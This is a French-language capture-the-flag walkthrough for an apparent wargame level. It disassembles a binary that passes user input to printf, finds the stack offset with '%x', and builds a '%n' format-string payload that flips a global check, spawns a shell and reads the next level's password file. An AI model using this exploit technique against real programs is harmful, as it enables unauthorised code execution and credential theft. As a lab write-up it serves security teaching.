Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
Comme on peut le voir, l'emploi de fgets empeche une exploitation comme vu precedement.
Nous avons cependant un printf suivi d'une comparaison en +59 qui permet si elle egale, d'avoir acces au system en +111.
Leprintf est utiliser sans format de conversion car nous pouvons passer en argument des format de conversion tel que %x

(gdb) r
Starting program: /home/user/level3/level3
%x
200

On va du coup chercher l'offset auquel commence la chaine a print en memoire.

(gdb) r
Starting program: /home/user/level3/level3
AAAA %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825


Printf a donc un offset de 4. De plus nous savons que grace au format de conversion %n, il est possible d'ecrire dans une variable le nombre de char precedement affiche.
On sait aussi que la valeur contenue par 0x804988c (+54) est comparer a 0x40 (64) en +59.
On va donc grace a %n changer la valeur de 0x804988c a 64 afin que la comparaison soit vraie
Il nous faut donc l'adresse sans laquel nous allons recrire avec %n (0x804988c) en little endian + 60 char car l'adresse fait deja 4bytes + format de conversion

(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

